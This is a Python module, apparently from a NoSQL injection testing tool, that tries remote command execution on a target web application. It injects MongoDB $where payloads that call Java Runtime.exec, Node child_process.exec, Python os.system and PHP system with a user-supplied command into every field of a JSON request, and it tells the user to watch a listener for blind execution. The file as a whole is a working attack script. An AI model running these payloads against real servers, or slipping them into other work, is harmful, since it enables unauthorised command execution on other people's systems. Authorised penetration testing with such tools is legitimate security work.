import copy
import json
from core.logger import Logger

class ServerShell:
    def __init__(self, requester, url, method, original_data, baseline_response):
        self.requester = requester
        self.url = url
        self.method = method
        self.original_data = original_data
        self.baseline = baseline_response
        self.logger = Logger()
        
        self.rce_payloads = [
            # 1. MongoDB with Java (Rhino Engine - Rare but dangerous)
            lambda cmd: {"$where": f"java.lang.Runtime.getRuntime().exec('{cmd}')"},
            
            # 2. Node.js / MongoDB Injection
            lambda cmd: {"$where": f"require('child_process').exec('{cmd}')"},
            
            # 3. Python / MongoDB Injection
            lambda cmd: {"$where": f"import os; os.system('{cmd}')"},
            
            # 4. PHP / MongoDB (Evaluated code)
            lambda cmd: {"$where": f"system('{cmd}')"}
        ]

    def run(self, command):
        self.logger.info(f"Starting Module: Remote Code Execution (RCE)")
        self.logger.info(f"Target Command: {command}")
        self.logger.warning("RCE is blind in most NoSQL cases. Check your listener/DNS logger.")
        
        if not self.original_data or not isinstance(self.original_data, dict):
            self.logger.error("No JSON data found to inject.")
            return

        for key in self.original_data.keys():
            for payload_gen in self.rce_payloads:
                payload = payload_gen(command)
                
                attack_data = copy.deepcopy(self.original_data)
                attack_data[key] = payload
                
                payload_preview = json.dumps(payload)
                print(f"\r\033[94m[?]\033[0m Injecting RCE at '{key}' -> {payload_preview}".ljust(90), end="")
                
                try:
                    self.requester.send(self.url, self.method, attack_data)
                    
                except Exception:
                    pass
        
        print("\n")
        self.logger.info("Payloads sent. If vulnerable, the command executed.")